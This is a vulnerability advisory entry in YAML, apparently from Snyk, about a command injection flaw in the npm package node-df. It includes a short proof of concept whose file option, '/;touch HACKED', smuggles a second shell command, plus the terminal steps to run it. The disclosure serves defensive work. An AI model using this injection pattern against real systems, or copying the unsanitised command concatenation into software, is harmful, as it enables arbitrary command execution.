---
- id: snykio:npm:node-df:536779
  title: Command Injection
  description: "[node-df][1] is a cross-platform Node.js wrapper around the standard\nUnix
    computer program (disk free).\n\nAffected versions of this package are vulnerable
    to Command Injection.\nThe issue occurs because a `user input` is concatenated
    inside a\n`command` that will be executed without any check.\n\n### PoC by mik317
    \  {#poc-by-mik317}\n\n    // poc.js\n    var df = require('node-df');\n    var
    options = {\n            file: '/;touch HACKED',\n            prefixMultiplier:
    'GB',\n            isDisplayPrefixMultiplier: true,\n            precision: 2\n
    \       };\n    \n    df(options, function (error, response) {\n        if (error)
    { throw error; }\n    \n        console.log(JSON.stringify(response, null, 2));\n
    \   });\n    Execute the following commands in terminal:\n    npm i node-df #
    Install affected module\n    ls # Make sure there isn't any *HACKED* file\n    node
    poc.js #  Run the PoC\n    ls # The *HACKED* file has been created\n\n\n\n[1]:
    https://www.npmjs.com/package/node-df\n"
  affected_package: node-df
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cwe:
  - CWE-78
  disclosed_date: 2019-12-04
  created_date: 2019-12-05
  last_modified_date: 2019-12-05
  credit:
  - mik317
  references:
  - https://github.com/adriano-di-giovanni/node-df/blob/master/lib/index.js#L36
  - https://hackerone.com/reports/703412
  source_url: https://snyk.io/vuln/SNYK-JS-NODEDF-536779
